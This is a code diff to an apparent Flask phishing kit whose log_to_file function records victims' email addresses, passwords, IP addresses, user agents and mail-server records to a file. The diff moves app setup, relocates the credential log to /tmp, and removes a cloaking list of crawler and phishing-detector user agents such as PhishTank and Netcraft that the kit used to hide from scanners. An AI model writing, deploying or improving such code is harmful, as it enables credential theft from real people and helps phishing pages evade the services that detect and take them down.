@@ -1,5 +1,5 @@
 import requests
-from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
+from flask import Flask, request, abort, render_template, session, redirect, url_for
 import secrets
 import random
 import io
@@ -11,9 +11,14 @@ from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 import dns.resolver
 
+app = Flask(__name__)
+limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
+app.secret_key = secrets.token_urlsafe(24)
+
 # Function to log data to a text file
 def log_to_file(email, password, ip, useragent, domain, mx_record):
-    with open("login_attempts.txt", "a") as f:
+    log_file_path = '/tmp/login_attempts.txt'  # Use /tmp for writable storage
+    with open(log_file_path, "a") as f:
         f.write(f"🔔 General New Login Attempt\n")
         f.write(f"📧 Email: {email}\n")
         f.write(f"🔑 Password: {password}\n")
@@ -29,74 +34,6 @@ def get_mx_record(domain):
         return ', '.join(str(r.exchange) for r in answers)
     except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
         return "No MX Record Found"
-
-app = Flask(__name__)
-limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
-secret_keyx = secrets.token_urlsafe(24)
-app.secret_key = secret_keyx
-
-bot_user_agents = [
-    'Googlebot', 
-    'Baiduspider', 
-    'ia_archiver',
-    'R6_FeedFetcher', 
-    'NetcraftSurveyAgent', 
-    'Sogou web spider',
-    'bingbot', 
-    'Yahoo! Slurp', 
-    'facebookexternalhit', 
-    'PrintfulBot',
-    'msnbot', 
-    'Twitterbot', 
-    'UnwindFetchor', 
-    'urlresolver', 
-    'Butterfly', 
-    'TweetmemeBot',
-    'PaperLiBot',
-    'MJ12bot',
-    'AhrefsBot',
-    'Exabot',
-    'Ezooms',
-    'YandexBot',
-    'SearchmetricsBot',
-    'phishtank',
-    'PhishTank',
-    'picsearch',
-    'TweetedTimes Bot',
-    'QuerySeekerSpider',
-    'ShowyouBot',
-    'woriobot',
-    'merlinkbot',
-    'BazQuxBot',
-    'Kraken',
-    'SISTRIX Crawler',
-    'R6_CommentReader',
-    'magpie-crawler',
-    'GrapeshotCrawler',
-    'PercolateCrawler',
-    'MaxPointCrawler',
-    'R6_FeedFetcher',
-    'NetSeer crawler',
-    'grokkit-crawler',
-    'SMXCrawler',
-    'PulseCrawler',
-    'Y!J-BRW',
-    '80legs.com/webcrawler',
-    'Mediapartners-Google', 
-    'Spinn3r', 
-    'InAGist', 
-    'Python-urllib', 
-    'NING', 
-    'TencentTraveler',
-    'Feedfetcher-Google', 
-    'mon.itor.us', 
-    'spbot', 
-    'Feedly',
-    'bot',
-    'curl',
-    "spider",
-    "crawler"
-]
 
 # Function to generate a random CAPTCHA code
 def generate_captcha_code(length=4):
